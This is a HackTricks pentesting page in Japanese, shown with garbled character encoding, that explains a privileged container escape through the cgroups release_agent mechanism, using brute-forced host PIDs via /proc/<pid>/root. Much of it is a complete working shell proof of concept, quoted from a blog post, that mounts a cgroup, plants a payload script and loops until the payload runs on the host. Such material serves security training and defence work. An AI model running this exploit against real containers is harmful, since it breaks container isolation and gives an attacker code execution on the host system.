<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ã§**@carlospolopm**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)ã‹ã‚‰**ãƒ–ãƒ­ã‚°ãƒãƒ¼ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„**ã€‚ã“ã‚Œã¯è¦ç´„ã§ã™ï¼š

ã“ã®æŠ€è¡“ã¯ã€Kata Containersã‚„ç‰¹å®šã®`devicemapper`è¨­å®šãªã©ã€ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã‚’éš ã™ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ãƒ‰ãƒ©ã‚¤ãƒãƒ¼è¨­å®šã«ã‚ˆã£ã¦å¼•ãèµ·ã“ã•ã‚Œã‚‹èª²é¡Œã‚’å…‹æœã—ã€**ã‚³ãƒ³ãƒ†ãƒŠå†…ã‹ã‚‰ãƒ›ã‚¹ãƒˆã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•**ã‚’æ¦‚èª¬ã—ã¦ã„ã¾ã™ã€‚

ä¸»ãªã‚¹ãƒ†ãƒƒãƒ—ï¼š

1. **ãƒ—ãƒ­ã‚»ã‚¹IDï¼ˆPIDï¼‰ã®ç‰¹å®šï¼š** Linuxç–‘ä¼¼ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®`/proc/<pid>/root`ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ›ã‚¹ãƒˆã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ›ã‚¹ãƒˆä¸Šã®ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‘ã‚¹ã‚’çŸ¥ã‚‹å¿…è¦ãŒãªããªã‚Šã¾ã™ã€‚
2. **PID Bashingï¼š** ãƒ›ã‚¹ãƒˆä¸Šã®PIDã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«ç·å½“ãŸã‚Šã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒæ¡ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€`/proc/<pid>/root/<file>`ã§ç‰¹å®šã®ãƒ•ã‚¡ã‚¤ãƒ«ã®å­˜åœ¨ã‚’é †æ¬¡ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€å¯¾å¿œã™ã‚‹PIDãŒã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã«å±ã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¾ã™ã€‚
3. **å®Ÿè¡Œã®ãƒˆãƒªã‚¬ãƒ¼ï¼š** æ¨æ¸¬ã•ã‚ŒãŸPIDãƒ‘ã‚¹ãŒ`cgroups release_agent`ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚ã“ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«ã‚ˆã‚Š`release_agent`ã®å®Ÿè¡ŒãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã®æˆåŠŸã¯ã€å‡ºåŠ›ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ç¢ºèªã•ã‚Œã¾ã™ã€‚

### æ‚ªç”¨ãƒ—ãƒ­ã‚»ã‚¹

æ‚ªç”¨ãƒ—ãƒ­ã‚»ã‚¹ã«ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã®æ­£ã—ã„PIDã‚’æ¨æ¸¬ã—ã¦ãƒ›ã‚¹ãƒˆä¸Šã§ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ã‚ˆã‚Šè©³ç´°ãªä¸€é€£ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ä»¥ä¸‹ã¯ã€ãã®å±•é–‹æ–¹æ³•ã§ã™ï¼š

1. **ç’°å¢ƒã®åˆæœŸåŒ–ï¼š** ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼ˆ`payload.sh`ï¼‰ãŒãƒ›ã‚¹ãƒˆä¸Šã§æº–å‚™ã•ã‚Œã€cgroupæ“ä½œã®ãŸã‚ã®ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒä½œæˆã•ã‚Œã¾ã™ã€‚
2. **ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®æº–å‚™ï¼š** ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã«ã¯ã€ãƒ›ã‚¹ãƒˆã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒãƒ³ãƒ‰ãŒå«ã¾ã‚Œã€å®Ÿè¡Œå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
3. **Cgroupã®è¨­å®šï¼š** cgroupãŒãƒã‚¦ãƒ³ãƒˆã•ã‚Œã€æ§‹æˆã•ã‚Œã¾ã™ã€‚`notify_on_release`ãƒ•ãƒ©ã‚°ãŒè¨­å®šã•ã‚Œã€cgroupãŒãƒªãƒªãƒ¼ã‚¹ã•ã‚Œã‚‹ã¨ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
4. **PIDã®ç·å½“ãŸã‚Šï¼š** ãƒ«ãƒ¼ãƒ—ãŒæ½œåœ¨çš„ãªPIDã‚’ç¹°ã‚Šè¿”ã—ã€æ¨æ¸¬ã•ã‚ŒãŸå„PIDã‚’`release_agent`ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒ`release_agent`ã¨ã—ã¦è¨­å®šã•ã‚Œã¾ã™ã€‚
5. **ãƒˆãƒªã‚¬ãƒ¼ã¨å®Ÿè¡Œã®ç¢ºèªï¼š** å„PIDã«å¯¾ã—ã¦ã€cgroupã®`cgroup.procs`ã«æ›¸ãè¾¼ã¿ã€PIDãŒæ­£ã—ã„å ´åˆã¯`release_agent`ã®å®Ÿè¡ŒãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å‡ºåŠ›ãŒè¦‹ã¤ã‹ã‚‹ã¾ã§ãƒ«ãƒ¼ãƒ—ãŒç¶šè¡Œã•ã‚Œã€æˆåŠŸã—ãŸå®Ÿè¡Œã‚’ç¤ºã—ã¾ã™ã€‚

ãƒ–ãƒ­ã‚°ãƒã‚¹ãƒˆã‹ã‚‰ã®PoCï¼š
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã€å½“ç¤¾ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
